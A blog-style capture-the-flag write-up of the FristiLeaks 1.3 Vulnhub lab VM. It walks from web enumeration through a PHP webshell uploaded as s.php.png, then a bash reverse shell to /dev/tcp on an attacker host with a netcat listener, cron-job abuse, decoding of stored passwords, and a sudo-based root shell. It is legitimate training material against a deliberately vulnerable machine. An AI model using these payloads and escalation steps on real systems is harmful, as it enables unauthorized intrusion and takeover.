---
layout: single_c
title:  "Vulnhub - FristiLeaks #1.3 Writeup"
date:   2020-02-16 10:43:16 +0530
categories: Vulnhub
tags: OSCP
classes: wide
---

## Description:
[Vulnhub - FristiLeaks #1.3](https://www.vulnhub.com/entry/fristileaks-13,133/)
A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..

## Enumeration
Starting off with `nmap` after adding `fristileaks` to `hosts` file.

### Nmap
```bash
Nmap scan report for fristileaks.com (192.168.29.5)
Host is up, received arp-response (0.00067s latency).
Scanned at 2020-02-16 00:30:56 EST for 12s
Not shown: 999 filtered ports
Reason: 990 no-responses and 9 host-prohibiteds
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:4A:3B:0D (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 16 00:31:08 2020 -- 1 IP address (1 host up) scanned in 14.25 seconds
```

So all we have is a web serve on port 80. Checking out the urls in robot.txt just returns a image stating that we are looking at the wrong url. Other enumeration methods turned up empty or useless results. I was banging my head against the wall looking for any possible attack avenue. In the end I has to go online to look for some hints. Turns out that there is a directory named `fristi`. How the hell was I supposed to find that?. Mahn I hate ctf based challenges. So anyways lets see whats in there.

insert image
    
We are greeted with a login page. Tried out some `sql` injection, but it doesn't  seems to vulnerable. Let's check if there is anything interesting in the source code.  


```html
<html>
<head>
<meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->
</head>
<body>
<center><h1> Welcome to #fristileaks admin portal</h1></center>
<center><img src="data:img/png;base64,/9j/4AAQSkZJRgABAgAAZABkAAD/7AARRHVja3k
AAQAEAAAAZAAA/+4ADkFkb2JlAGTAAAAAAf/bAIQAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQICAgICAgICAgICAwMDAwMDAwMDAwEBAQEBAQECAQECAgIBAgIDAwMDA

------output snipped----------
    
<!-- 
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
-->
    
------output snipped----------
```

We have a message by user `eezeepz` and we have two images encode in base64.(I didn't you could do that). The second image seems to be commented out. We can use a [base64 to png converter](https://onlinepngtools.com/convert-base64-to-png) to check the contents.

insert image
    
We are presented with a string, which might be probably be the password for `eezeepz`. Login into the admin console using the password `keKkeKKeKKeKkEkkEk`.

insert image
    
We are greeted with a upload file page, that only allows `png,jpg,gif`. After trying out various payloads, I found the following.

1. The file has to end with `.png` to be uploaded
2. The [magic byte]() of the file is irrelevant.

I used simple php backdoor available at `/usr/share/webshells/php/simple-backdoor.php`, renamed it as `s.php.png` and uploaded it.


## Low Shell

```bash
fristileaks.com/fristi/uploads/s.php.png?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.29.3%2F4444%200%3E%261
```

Start `nc` and wait for a connection.

```bash
kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
connect to [192.168.29.3] from fristileaks.com [192.168.29.5] 43601
bash: no job control in this shell
bash-4.1$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

## Low Shell Enum

There are some interesting files in the home folder `/home/eezeepz`.

```bash
bash-4.1$ cat notes.txt 
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

Looks like a note from a user with higher privilege. Looks like we can run an binary as user `admin` by copying the command to a text file in `/tmp/`. The allowed binaries include `chmod`, `df`, `cat`, `echo`, `ps`, `grep`, `egrep`. We can change the permission of home directory of `admin` and see whats in there.


```bash
bash-4.1$ echo "/home/admin/chmod 777 /home/admin" > runthis
echo "/home/admin/chmod 777 /home/admin" > runthis
bash-4.1$ ls  
ls
1
cronresult
runthis
bash-4.1$ cat cronresult
cat cronresult
/usr/binexecuting: /home/admin/chmod 777 /home/admin/
```

Check the permissions on `admin` home directory.

```bah
bash-4.1$ cd /home
cd /home
bash-4.1$ ls -la
ls -la
total 32
drwxr-xr-x.  6 root      root       4096 Feb 16 00:06 .
dr-xr-xr-x. 22 root      root       4096 Feb 15 23:53 ..
drwxrwxrwx.  2 admin     admin      4096 Nov 19  2015 admin
drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz
drwx------   2 fristigod fristigod  4096 Nov 19  2015 fristigod
```

Opening the `admin` directory gives us few interesting files.

```bash
bash-4.1$ ls -la
ls -la
total 652
drwxrwxrwx. 2 admin     admin       4096 Nov 19  2015 .
drwxr-xr-x. 6 root      root        4096 Feb 16 00:06 ..
-rw-r--r--. 1 admin     admin         18 Sep 22  2015 .bash_logout
-rw-r--r--. 1 admin     admin        176 Sep 22  2015 .bash_profile
-rw-r--r--. 1 admin     admin        124 Sep 22  2015 .bashrc
-rwxr-xr-x  1 admin     admin      45224 Nov 18  2015 cat
-rwxr-xr-x  1 admin     admin      48712 Nov 18  2015 chmod
-rw-r--r--  1 admin     admin        737 Nov 18  2015 cronjob.py
-rw-r--r--  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
-rw-r--r--  1 admin     admin        258 Nov 18  2015 cryptpass.py
-rwxr-xr-x  1 admin     admin      90544 Nov 18  2015 df
-rwxr-xr-x  1 admin     admin      24136 Nov 18  2015 echo
-rwxr-xr-x  1 admin     admin     163600 Nov 18  2015 egrep
-rwxr-xr-x  1 admin     admin     163600 Nov 18  2015 grep
-rwxr-xr-x  1 admin     admin      85304 Nov 18  2015 ps
-rw-r--r--  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
bash-4.1$ 
```

1. A file by user `fristigod` containing the following that looks like a reversed `base64` text. Probably the password for `fristigod`
```bash
bash-4.1$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
```

2. A file named `cryptedpass.txt` that again contains a kind of `base64` text.
```bash
cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq
```

3. A python script named `cryptpass.py`
```python
bash-4.1$ cat cryptpass.py
cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

Okay so look like a python script is used to encrypt the password of `fristigod` and `admin`. Lets write a script that will run the algorithm in reverse and decode the password.

### Python Decode Script

```python
PS C:\> python
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> import codecs
>>> def decode(str):
...     rotstr = codecs.decode(str, 'rot13')[::-1]
...     return base64.b64decode(rotstr)
...
>>> decode("mVGZ3O3omkJLmy2pcuTq")
b'thisisalsopw123'
>>> decode("=RFn0AKnlMHMPIzpyuTI0ITG")
b'LetThereBeFristi!'
```

We have the password of `fristigod`. Change user to `fristigod`.

```bash
bash-4.1$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.1$ su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1$ id
id
uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
```

## Root Shell
After poking around, I found a directory `/var/fristigod/.secret_admin_stuff`

```bash
bash-4.1$ pwd
pwd
/var/fristigod
bash-4.1$ ls -la
ls -la
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .
drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
-rw-------   1 fristigod fristigod 1780 Feb 16 00:09 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff

```

`.bash_history` contains the following

```bash
bash-4.1$ cat .bash*
cat .bash*
ls
pwd
ls -lah
cd .secret_admin_stuff/
ls
./doCom 
./doCom test
sudo ls
exit
cd .secret_admin_stuff/
ls
./doCom 
sudo -u fristi ./doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
sudo /var/fristigod/.secret_admin_stuff/doCom
exit
sudo /var/fristigod/.secret_admin_stuff/doCom
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
groups
ls -lah
usermod -G fristigod fristi
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
```

We can run sudo command using the `doCom` binary. Lets pop a shell using the same binary.

```bash
bash-4.1$ ls
ls
doCom
bash-4.1$ sudo -u fristi ./doCom id
sudo -u fristi ./doCom id
[sudo] password for fristigod: LetThereBeFristi!

uid=0(root) gid=100(users) groups=100(users),502(fristigod)


sudo -u fristi ./doCom /bin/sh
sh-4.1# ud
ud
sh: ud: command not found
sh-4.1# id
id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
sh-4.1# cd /root
cd /root
sh-4.1# ls
ls
1  fristileaks_secrets.txt
sh-4.1# cat fris*
cat fris*
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1


sh-4.1# 
```

And we are root!
